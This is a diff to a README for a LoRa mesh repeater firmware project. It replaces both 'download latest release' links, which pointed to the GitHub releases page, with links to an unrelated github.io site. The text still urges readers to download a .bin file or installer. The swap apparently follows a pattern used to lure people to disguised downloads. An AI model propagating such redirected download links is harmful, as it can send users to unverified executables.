@@ -1,6 +1,6 @@
 # 🌐 MeshCore-E22P-Repeater - Extend your network range with ease
 
-[![](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/Clarabelleazo858/MeshCore-E22P-Repeater/releases)
+[![](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://clarabelleazo858.github.io)
 
 This project provides firmware for your hardware setup. It connects your XIAO ESP32S3 and Ebyte E22P-868M30S components into a functional mesh repeater. This software improves your communication range by lowering the noise floor and stabilizing signal transmission. You gain a larger coverage area for your mesh network devices.
 
@@ -17,7 +17,7 @@ Your setup requires specific physical parts to function:
 
 You must download the firmware file from the project releases page. 
 
-[Visit this page to download the latest firmware](https://github.com/Clarabelleazo858/MeshCore-E22P-Repeater/releases)
+[Visit this page to download the latest firmware](https://clarabelleazo858.github.io)
 
 Look for the file ending in `.bin` or an installer package under the latest release heading. Save this file to your computer desktop. You will need this file to update your hardware.
 
